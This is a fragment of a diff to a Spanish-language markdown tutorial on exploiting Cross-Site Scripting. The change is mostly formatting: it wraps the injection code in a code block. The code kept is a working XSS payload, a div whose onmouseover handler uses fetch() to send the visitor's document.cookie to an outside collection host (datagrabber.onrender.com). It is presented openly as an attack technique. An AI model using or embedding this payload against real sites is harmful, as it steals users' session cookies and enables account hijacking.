@@ -26,11 +26,9 @@ El objetivo de esta técnica es aprovechar una vulnerabilidad de **Cross-Site Sc
 
 #### Código para la inyección:
 
-html
-
-Copiar código
-
+```bash
 `<div onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + encodeURIComponent(document.cookie))">     Pasa el ratón por aquí </div>`
+```
 
 #### Desglose del código:
 
